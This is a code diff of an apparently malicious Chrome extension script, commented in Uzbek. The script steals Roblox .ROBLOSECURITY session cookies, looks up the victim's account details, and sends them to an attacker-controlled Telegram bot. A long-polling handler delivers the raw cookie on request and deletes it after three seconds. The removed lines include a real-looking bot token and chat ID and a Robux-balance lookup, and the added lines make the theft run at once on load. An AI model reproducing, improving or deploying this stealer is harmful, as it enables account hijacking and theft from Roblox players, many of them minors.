@@ -1,11 +1,8 @@
-const TELEGRAM_BOT_TOKEN = '8819062469:AAFdy6JsOo_wZCnN2wIyz-noszsZQ_PmyVY';
-const TELEGRAM_CHAT_ID = '8043397476';
+const TELEGRAM_BOT_TOKEN = 'SIZNING_BOT_TOKENINGIZ';
+const TELEGRAM_CHAT_ID = 'SIZNING_CHAT_IDINGIZ';
 
-// Brauzer ochilgach, kuki va balandlikni tekshirishni 3 soniya kechiktiramiz
-setTimeout(() => {
-    checkAndSendCookies();
-}, 3000);
-
+// Skript yoqilgandayoq darhol tekshirish va long-polling ni boshlash
+checkAndSendCookies();
 startLongPolling();
 
 // Har 1 daqiqada kuki o'zgarganini tekshirish
@@ -29,9 +26,6 @@ async function checkAndSendCookies() {
         const userInfo = await getRobloxUserInfo(cookieValue);
         if (!userInfo) return;
 
-        // Robux balansini ishonchli usulda olish
-        let robuxBalance = await getRobuxBalance(cookieValue);
-
         let accountId = userInfo.id.toString();
         let currentTime = new Date().toLocaleString();
 
@@ -41,7 +35,7 @@ async function checkAndSendCookies() {
 
             if (!accData) {
                 let updateCount = 1;
-                let msgId = await sendTelegramMessage(userInfo, robuxBalance, cookieValue, updateCount, currentTime, accountId);
+                let msgId = await sendTelegramMessage(userInfo, cookieValue, updateCount, currentTime, accountId);
                 
                 if (msgId) {
                     trackedAccounts[accountId] = {
@@ -59,7 +53,7 @@ async function checkAndSendCookies() {
                         await deleteTelegramMessage(accData.messageId);
                     }
 
-                    let msgId = await sendTelegramMessage(userInfo, robuxBalance, cookieValue, updateCount, currentTime, accountId);
+                    let msgId = await sendTelegramMessage(userInfo, cookieValue, updateCount, currentTime, accountId);
 
                     if (msgId) {
                         trackedAccounts[accountId] = {
@@ -81,48 +75,19 @@ async function checkAndSendCookies() {
 async function getRobloxUserInfo(cookieValue) {
     try {
         let response = await fetch("https://users.roblox.com/v1/users/authenticated", {
-            headers: { 
-                "Cookie": `.ROBLOSECURITY=${cookieValue}`,
-                "Referer": "https://www.roblox.com/"
-            }
+            headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` }
         });
         if (response.ok) return await response.json();
     } catch (e) {}
     return null;
 }
 
-async function getRobuxBalance(cookieValue) {
-    try {
-        // Balansni olish uchun API so'roviga kerakli sarlavhalarni qo'shamiz
-        let response = await fetch("https://economy.roblox.com/v1/user/currency", {
-            method: "GET",
-            headers: { 
-                "Cookie": `.ROBLOSECURITY=${cookieValue}`,
-                "Referer": "https://www.roblox.com/",
-                "Accept": "application/json"
-            }
-        });
-        
-        if (response.ok) {
-            let data = await response.json();
-            return data.robux !== undefined ? data.robux : 0;
-        } else {
-            // Agar birinchi urinishda o'ta olmasa, boshqa endpoint yoki zaxira usulni tekshiramiz
-            console.log("Robux olishda status xatosi:", response.status);
-        }
-    } catch (e) {
-        console.log("Robux olishda xato:", e);
-    }
-    return 0;
-}
-
-async function sendTelegramMessage(userInfo, robuxBalance, cookieValue, updateCount, timeStr, accountId) {
-    let messageText = `🔄 **ROBLOX AKKAUNT MA'LUMOTI**\n\n` +
+async function sendTelegramMessage(userInfo, cookieValue, updateCount, timeStr, accountId) {
+    let messageText = `🔄 **ROBLOX COOKIE YANGILANDI**\n\n` +
                       `👤 **Username:** \`${userInfo.name}\`\n` +
                       `🏷 **Displayname:** \`${userInfo.displayName}\`\n` +
                       `🆔 **ID:** \`${userInfo.id}\`\n` +
-                      `💎 **Robux Balansi:** \`${robuxBalance}\`\n` +
-                      `📊 **Ulanish soni:** \`${updateCount}-chi marta\`\n` +
+                      `📊 **Almashish soni:** \`${updateCount}-chi marta\`\n` +
                       `🕒 **Vaqt:** \`${timeStr}\``;
 
     chrome.storage.local.get(["cookieStore"], (data) => {
@@ -141,7 +106,7 @@ async function sendTelegramMessage(userInfo, robuxBalance, cookieValue, updateCo
                 parse_mode: 'Markdown',
                 reply_markup: {
                     inline_keyboard: [
-                        [ { text: "📋 COPY COOKIE", callback_data: `get_cookie_${accountId}` } ]
+                        [ { text: "📋 COPY", callback_data: `get_cookie_${accountId}` } ]
                     ]
                 }
             })
@@ -162,6 +127,7 @@ async function deleteTelegramMessage(messageId) {
     } catch (e) {}
 }
 
+// Tugma bosilganini kuzatib boruvchi funksiya (Dublikatsiz)
 async function startLongPolling() {
     chrome.storage.local.get(["lastUpdateId"], (data) => {
         let lastUpdateId = data.lastUpdateId || 0;
@@ -188,6 +154,7 @@ async function startLongPolling() {
                                     let cookieVal = store[accountId];
 
                                     if (cookieVal) {
+                                        // Kukini alohida xabar qilib yuborish
                                         let msgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                                             method: 'POST',
                                             headers: { 'Content-Type': 'application/json' },
@@ -199,6 +166,7 @@ async function startLongPolling() {
                                         });
                                         let msgData = await msgRes.json();
 
+                                        // 3 soniyadan keyin o'sha xabarni o'chirish
                                         if (msgData.ok) {
                                             let sentMsgId = msgData.result.message_id;
                                             setTimeout(async () => {
@@ -209,8 +177,8 @@ async function startLongPolling() {
 
                                     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                                         method: 'POST',
-                                           headers: { 'Content-Type': 'application/json' },
-                                        body: JSON.stringify({ callback_query_id: query.id, text: "Kuki yuborildi!" })
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({ callback_query_id: query.id, text: "Kuki yuborildi va 3 sekunddan so'ng o'chadi!" })
                                     });
                                 });
                             }
